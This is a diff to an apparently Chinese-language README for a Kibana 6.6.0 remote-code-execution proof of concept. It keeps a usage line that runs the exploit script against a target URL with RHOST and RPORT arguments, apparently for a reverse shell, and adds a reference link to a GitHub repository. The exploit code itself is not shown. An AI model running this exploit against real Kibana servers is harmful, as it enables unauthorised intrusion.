@@ -21,3 +21,7 @@ POC：
 ## 脚本使用
 python kibana6.6.0RCE.py http://ip:port RHOST RPORT
 ![](./rce.jpg)
+
+
+## 参考链接
+https://github.com/jas502n/kibana-RCE
